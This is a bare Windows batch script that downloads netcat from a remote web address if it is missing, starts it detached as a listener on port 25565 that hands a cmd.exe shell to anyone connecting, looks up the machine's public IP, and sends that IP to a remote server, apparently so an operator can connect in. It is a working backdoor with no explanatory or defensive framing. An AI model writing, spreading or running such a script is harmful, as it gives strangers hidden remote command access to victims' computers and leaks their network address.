::@echo off
::mode con: cols=15 lines=1

set file=nc64.exe
set ip=nodeserver.net;

cd ../../../../../../..

::start netcat
if exist %file% (

  start nc64.exe -d -lp 25565 -e cmd.exe

) else (

  ::Download Netcat from Server
  powershell "wget http://website.net/scripts/nc64.exe -OutFile ~/%file%" && start %file% -d -lp 25565 -e cmd.exe

)

::Read IP
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

::Ping ip to server
start nc64.exe -c "echo %PublicIP%" %ip% 25565
